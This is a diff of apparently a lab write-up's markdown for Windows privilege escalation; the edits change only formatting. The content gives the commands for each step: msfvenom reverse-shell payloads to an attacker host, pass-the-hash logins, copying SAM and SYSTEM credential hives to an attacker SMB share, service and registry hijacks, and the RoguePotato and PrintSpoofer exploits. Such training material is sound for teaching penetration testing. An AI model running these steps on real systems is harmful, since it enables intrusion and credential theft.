@@ -2,13 +2,13 @@
 
 ### Connecting with RDP Port 3389
 
-```text
+```
 xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.34.38
 ```
 
 ### Connecting with winexe or pth-winexe
 
-```text
+```
 winexe -U 'admin%password' //10.10.107.212 cmd.exe
 
 pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.107.212 cmd.exe
@@ -16,9 +16,9 @@ pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd
 
 ### Making SMB Server to send Rev-shell
 
-Generate a reverse shell executable \(reverse.exe\) using msfvenom.
+Generate a reverse shell executable (reverse.exe) using msfvenom.
 
-```text
+```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
 ```
 
@@ -28,7 +28,7 @@ On Kali, in the same directory as reverse.exe:
 
 `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
 
-On Windows \(update the IP address with your Kali IP\):
+On Windows (update the IP address with your Kali IP):
 
 `copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`
 
@@ -40,7 +40,7 @@ Then run the reverse.exe executable on Windows and catch the shell:
 
 `C:\PrivEsc\reverse.exe`
 
-![](.gitbook/assets/image%20%2840%29.png)
+![](<.gitbook/assets/image (40).png>)
 
 ### Service Exploits - Insecure Service Permissions
 
@@ -48,17 +48,17 @@ Use accesschk.exe to check the "user" account's permissions on the "daclsvc" ser
 
 `C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
 
-![](.gitbook/assets/image%20%2841%29.png)
+![](<.gitbook/assets/image (41).png>)
 
-Note that the "user" account has the permission to change the service config \(SERVICE\_CHANGE\_CONFIG\).
+Note that the "user" account has the permission to change the service config (SERVICE\_CHANGE\_CONFIG).
 
-Query the service and note that it runs with SYSTEM privileges \(SERVICE\_START\_NAME\):
+Query the service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME):
 
 `sc qc daclsvc`
 
-![](.gitbook/assets/image%20%2842%29.png)
+![](<.gitbook/assets/image (42).png>)
 
-Modify the service config and set the BINARY\_PATH\_NAME \(binpath\) to the reverse.exe executable you created:
+Modify the service config and set the BINARY\_PATH\_NAME (binpath) to the reverse.exe executable you created:
 
 `sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`
 
@@ -68,7 +68,7 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 ### Service Exploits - Unquoted Service Path
 
-Query the "unquotedsvc" service and note that it runs with SYSTEM privileges \(SERVICE\_START\_NAME\) and that the BINARY\_PATH\_NAME is unquoted and contains spaces.
+Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME) and that the BINARY\_PATH\_NAME is unquoted and contains spaces.
 
 `sc qc unquotedsvc`
 
@@ -86,11 +86,11 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 ### Service Exploits - Weak Registry Permissions
 
-Query the "regsvc" service and note that it runs with SYSTEM privileges \(SERVICE\_START\_NAME\).
+Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME).
 
 `sc qc regsvc`
 
-Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group \(essentially all logged-on users\):
+Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
 
 `C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
 
@@ -104,11 +104,11 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 ### Service Exploits - Insecure Service Executables
 
-Query the "filepermsvc" service and note that it runs with SYSTEM privileges \(SERVICE\_START\_NAME\).
+Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME).
 
 `sc qc filepermsvc`
 
-Using accesschk.exe, note that the service binary \(BINARY\_PATH\_NAME\) file is writable by everyone:
+Using accesschk.exe, note that the service binary (BINARY\_PATH\_NAME) file is writable by everyone:
 
 `C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`
 
@@ -134,23 +134,23 @@ Copy the reverse.exe executable you created and overwrite the AutoRun executable
 
 `copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`
 
-Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin \(admin/password123\) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!  
+Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!\
 `rdesktop 10.10.64.1`
 
 ### Registry - AlwaysInstallElevated
 
 Query the registry for AlwaysInstallElevated keys:
 
-`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\
+`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
 
-Note that both keys are set to 1 \(0x1\).
+Note that both keys are set to 1 (0x1).
 
-On Kali, generate a reverse shell Windows Installer \(reverse.msi\) using msfvenom. Update the LHOST IP address accordingly:
+On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
 
 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`
 
-Transfer the reverse.msi file to the C:\PrivEsc directory on Windows \(use the SMB server method from earlier\).
+Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).
 
 Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:
 
@@ -158,7 +158,7 @@ Start a listener on Kali and then run the installer to trigger a reverse shell r
 
 ### Passwords - Registry
 
-\(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: password123\)
+(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: password123)
 
 The registry can be searched for keys and values that contain the word "password":
 
@@ -168,7 +168,7 @@ If you want to save some time, query this specific key to find admin AutoLogon c
 
 `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
 
-On Kali, use the winexe command to spawn a command prompt running with the admin privileges \(update the password with the one you found\):
+On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
 
 `winexe -U 'admin%password' //10.10.107.212 cmd.exe`
 
@@ -184,20 +184,20 @@ Start a listener on Kali and run the reverse.exe executable using runas with the
 
 `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
 
-### Passwords - Security Account Manager \(SAM\)
+### Passwords - Security Account Manager (SAM)
 
 The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.
 
 Transfer the SAM and SYSTEM files to your Kali VM:
 
-`copy C:\Windows\Repair\SAM \\10.10.10.10\kali\  
-copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\`
+`copy C:\Windows\Repair\SAM \\10.10.10.10\kali\`\
+`copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\`
 
-On Kali, clone the creddump7 repository \(the one on Kali is outdated and will not dump hashes correctly for Windows 10!\) and use it to dump out the hashes from the SAM and SYSTEM files:
+On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:
 
-`git clone https://github.com/Tib3rius/creddump7  
-pip3 install pycrypto  
-python3 creddump7/pwdump.py SYSTEM SAM`
+`git clone https://github.com/Tib3rius/creddump7`\
+`pip3 install pycrypto`\
+`python3 creddump7/pwdump.py SYSTEM SAM`
 
 Crack the admin NTLM hash using hashcat:
 
@@ -265,28 +265,28 @@ Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Wind
 
 `sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.107.212:9999`
 
-Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt \(right-click -&gt; run as administrator\) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:
+Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:
 
 `C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
 
 Start another listener on Kali.
 
-Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges \(update the IP address with your Kali IP accordingly\):
+Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):
 
 `C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999`
 
-![](.gitbook/assets/image%20%2843%29.png)
+![](<.gitbook/assets/image (43).png>)
 
 ### Token Impersonation - PrintSpoofer
 
-Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt \(right-click -&gt; run as administrator\) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:  
+Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:\
 
 
 `C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
 
 Start another listener on Kali.
 
-Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges \(update the IP address with your Kali IP accordingly\):
+Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):
 
 `C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`
 
@@ -299,6 +299,4 @@ Seatbelt.exe
 PowerUp.ps1
 
 SharpUp.exe
-
-
 
